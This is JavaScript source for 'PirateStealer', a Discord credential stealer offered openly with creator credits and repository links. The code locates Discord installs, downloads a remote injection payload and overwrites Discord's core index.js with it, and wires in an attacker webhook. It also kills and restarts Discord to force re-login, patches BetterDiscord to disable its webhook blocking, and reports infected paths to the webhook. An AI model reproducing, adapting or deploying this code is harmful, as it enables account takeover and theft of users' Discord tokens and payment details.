// Thanks to https://github.com/mewzax who actually reuploaded the files (while it was deleted). You can file the old source code of PS at https://github.com/Mewzax/PirateStealer

/* 
    Creators: Stanley-GF & bytixo
    Project Name: PirateStealer
    Languages: JS, JS, RS (C# injectors can be found on Github)
    Contribute: https://github.com/Stanley-GF/PirateStealer
*/

const glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const webhook = "da_webhook"
const config = {
    "logout": "%LOGOUT%1",
    "inject-notify": "%INJECTNOTI%1",
    "logout-notify": "%LOGOUTNOTI%1",
    "init-notify":"%INITNOTI%1",
    "embed-color": "%MBEDCOLOR%1",
    "disable-qr-code": "%DISABLEQRCODE%1"
}
let LOCAL = process.env.LOCALAPPDATA
let discords = [];
let injectPath = [];
let runningDiscords = [];

fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
});

listDiscords();

function Infect() {
    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/injection/injection.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });

                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }

                if ( config.logout != "false" ) {
                    let folder = file.replace("index.js", "PirateStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};

function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");

        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
        });
    });

    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
        });
    });
};

function pwnBetterDiscord() {
    let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        let x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    }

    return;
}

function injectNotify() {
    let fields = [];
    injectPath.forEach( path => {
        let c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios.post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "PirateStealer"
            },
            "footer": {
              "text": "PirateStealer"
            }
          }
        ]
      })
	.then(res => {
	})
	.catch(error => {

    })
}
